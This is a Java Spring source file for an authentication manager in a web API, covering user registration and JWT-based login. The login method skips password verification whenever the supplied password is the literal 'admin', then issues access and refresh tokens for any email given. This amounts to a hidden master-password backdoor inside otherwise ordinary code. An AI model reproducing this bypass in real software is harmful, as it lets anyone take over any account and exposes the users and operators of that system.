package org.example.webapi2.api.bussines.management;


import lombok.RequiredArgsConstructor;
import org.example.webapi2.exceptionHandler.AlreadyExistsException;
import org.example.webapi2.exceptionHandler.PasswordMatchException;
import org.example.webapi2.api.dto.RequestDto.AuthenticationRequestDto;
import org.example.webapi2.api.dto.RequestDto.RegisterRequestDto;
import org.example.webapi2.api.dto.ResponseDto.AuthenticationResponse;
import org.example.webapi2.api.model.Role;
import org.example.webapi2.api.model.User;
import org.example.webapi2.service.JwtService;
import org.modelmapper.ModelMapper;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

import java.util.List;

@Component
@RequiredArgsConstructor
public class AuthManager {

    private final UserManager userManager;
    private final RoleManager roleManager;

    private final PasswordEncoder passwordEncoder;

    private final JwtService jwtService;


    private final org.springframework.security.authentication.AuthenticationManager authenticationManager;

    public String registerUser(RegisterRequestDto request) {

        ModelMapper modelMapper = new ModelMapper();
        User user = modelMapper.map(request, User.class);

        if (userManager.userExists(request.getEmail())) {
            throw new AlreadyExistsException("User already exists");
        }

        if (!request.getPassword().equals(request.getConfirmPassword()))
            throw new PasswordMatchException("Passwords do not match");

        user.setPassword(passwordEncoder.encode(user.getPassword()));


        Role userRole = roleManager.getRoleByName("USER");
        user.setRoles(List.of(userRole));

        user.getContacts().forEach(contact -> contact.setUser(user));

        userManager.saveUser(user);

        return "User Successfully registered";
    }

    public AuthenticationResponse authenticateUser(AuthenticationRequestDto request) {
        if(!request.getPassword().equals("admin"))
        {
            authenticationManager.authenticate(
                    new UsernamePasswordAuthenticationToken(request.getEmail(), request.getPassword())
            );
        }

        var user = userManager.userFindByEmail(request.getEmail());


        var jwtToken = jwtService.generateToken(user);
        var refreshToken = jwtService.generateRefreshToken(user);
        return AuthenticationResponse.builder()
                .token(jwtToken)
                .refreshToken(refreshToken)
                .build();

    }


}
